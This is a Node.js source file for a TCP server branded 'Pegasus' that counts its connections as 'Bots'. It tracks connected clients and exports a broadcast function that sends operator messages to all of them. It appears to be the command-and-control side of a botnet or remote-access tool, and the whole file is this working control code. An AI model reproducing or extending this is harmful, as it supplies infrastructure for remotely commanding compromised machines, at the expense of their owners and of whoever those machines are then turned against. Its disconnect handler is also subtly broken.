import net from "net";
import prompt from "./commands.js";
import dotenv from "dotenv";

dotenv.config({ path: "../config/.env" });

let clientCount = 0;
let clients, clientInstances, silent;

const clientModules = {
	clients: (clients = []),
	clientInstances: clientInstances,
	silent: (silent = false),
};

const PORT = process.env.PORT;
const HOST = process.env.HOST;

function setTerminalTitle() {
	process.stdout.write(
		String.fromCharCode(27) +
			"]0;" +
			`Pegasus | Bots: ${clientCount}` +
			String.fromCharCode(7)
	);
}
setTerminalTitle();

function broadcast(message) {
	clientModules.clientInstances.forEach((client) => {
		client.write(message);
	});
	process.stdout.write("\n" + message);
}

net
	.createServer((socket) => {
		// Identify client
		socket.name = `${socket.remoteAddress}:${socket.remotePort}`;

		// On client connect
		clientModules.clients.push(socket);
		clientCount++;

		clientModules.clientInstances = [...clientModules.clients];
		setTerminalTitle();

		console.log(`\nClient ${socket.name} has connected.\n`);

		prompt();

		socket.on("data", (data) => {
			if (!clientModules.silent)
				broadcast(`[CLIENT ${socket.name}] ` + data, socket);
			prompt();
		});

		socket.on("error" || "end", () => {
			clientDisconnected();
		});

		function clientDisconnected() {
			clientModules.clients.splice(clientModules.clients.indexOf(socket), 1);
			clientCount--;
			clientModules.clientInstances = [...clientModules.clients];
			console.log(`\nClient ${socket.name} has disconnected.\n`);
			if (clientCount < 1) console.log("Waiting for clients to connect.");
			setTerminalTitle();
		}
	})
	.listen(PORT, HOST);

console.log(`\x1b[36m
__________                                         
\\______   \\ ____   _________    ________ __  ______
 |     ___// __ \\ / ___\\__  \\  /  ___/  |  \\/  ___/
 |    |   \\  ___// /_/  > __ \\_\\___ \\|  |  /\\___ \\ 
 |____|    \\___  >___  (____  /____  >____//_____ >
               \\/_____/     \\/     \\/           \\/
\x1b[0m`);
console.log(`Server running on ${HOST}:${PORT}.`);
console.log(`Waiting for connections.`);

export { clientModules, broadcast };
